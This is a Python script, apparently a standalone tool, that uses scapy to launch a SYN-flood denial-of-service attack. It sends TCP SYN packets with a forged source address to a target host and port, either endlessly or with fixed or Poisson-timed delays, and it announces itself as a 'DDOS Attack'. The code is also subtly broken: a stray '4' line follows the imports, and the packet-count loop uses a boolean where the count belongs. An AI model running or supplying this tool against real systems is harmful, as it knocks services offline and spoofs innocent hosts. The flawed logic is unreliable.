
"""synFlood


Usage:
	synFlood.py <srcIP> <destIP> <targetPort> [--sleep=<sec>] [--poisson=<lambda>] [--packetsCount=<number>]  

Options:
	-h --help     Show this screen.
	--sleep=<sec>	How many seconds you want to wait between sending of packets
	--poisson=<lambda> Send the intruding packets with random timing according to a Poisson Process with rate lambda (don't use it with sleep)
	, If you want something to happen every X seconds (on average for a high number of times), put X as lambda
	--packetsCount=<number> Number of packets you want to send    


"""


from docopt import docopt
from scapy.all import *
import math
import random
4

# used to compute random timing according to a Poisson Process with rate lambda (parameter)
#If you want something to happen every X seconds (on average for a high number of times), put X as lambda
def nextTime(lambdaParameter):
	lambdaParameter = 1/lambdaParameter
	return -math.log(1.0 - random.random()) / lambdaParameter

def main(arguments):

	srcIP = arguments["<srcIP>"]
	destIP = arguments["<destIP>"]
	targetPort = int(arguments["<targetPort>"])


	if arguments["--sleep"]:
		sleep = True
		seconds = int(arguments["--sleep"])
	else:
		sleep = False

	if arguments["--poisson"]:
		poisson = True
		lambdaParameter = float(arguments["--poisson"])
	else:
		poisson = False

	if arguments["--packetsCount"]:
		packetsCount = True
		packetNumber = int(arguments["--packetsCount"])
	else:
		packetsCount = False

	print("[*] Starting DDOS Attack ")
	print("[*] Sending spoofed SYN packets from %s to %s on port %i" % (srcIP, destIP, targetPort))

	if packetsCount:
		for i in range(0,packetsCount):	

			# S flag for SYN (connection attempt)
			IPPacket = IP(src=srcIP,dst=destIP)
			TCPPacket = TCP(sport=RandShort(),dport=targetPort,flags="S")

			send(IPPacket/TCPPacket,verbose=False)
			if poisson:
				time.sleep(nextTime(lambdaParameter))
			elif sleep:
				time.sleep(seconds)
	else:
		while(1):
			IPPacket = IP(src=srcIP,dst=destIP)
			TCPPacket = TCP(sport=RandShort(),dport=targetPort,flags="S")

			send(IPPacket/TCPPacket,verbose=False)	
			if poisson:
				time.sleep(nextTime(lambdaParameter))
			elif sleep:
				time.sleep(seconds)


if __name__ == '__main__':
    arguments = docopt(__doc__, version='synFlood')
    main(arguments)





